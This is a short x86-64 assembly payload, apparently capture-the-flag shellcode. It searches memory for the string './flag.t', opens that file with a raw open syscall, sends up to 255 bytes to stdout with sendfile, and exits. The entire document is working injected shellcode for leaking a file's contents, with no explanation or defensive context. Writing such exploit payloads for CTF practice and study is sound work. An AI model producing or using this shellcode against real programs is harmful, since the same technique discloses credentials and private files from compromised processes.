BITS 64

; hunt for string based on rdx
hunt:
add rdx, 0x4
mov rax, 0x742e67616c662f2e   ; ./flag.t
cmp rax, [rdx]
jne hunt

xor rax, rax
mov rdi, rdx              ; path
xor rax, rax
mov al, 2                 ; rax for SYS_open
xor rdx, rdx              ; mode
xor rsi, rsi              ; flags
syscall

xor rdi, rdi
inc rdi                   ; out_fd
mov rsi, rax              ; in_fd from open
xor rdx, rdx              ; offset
mov r10, 0xFF             ; count
mov rax, 40               ; SYS_sendfile
syscall

xor rax, rax
mov al, 60                ; SYS_exit
xor rdi, rdi              ; code
syscall
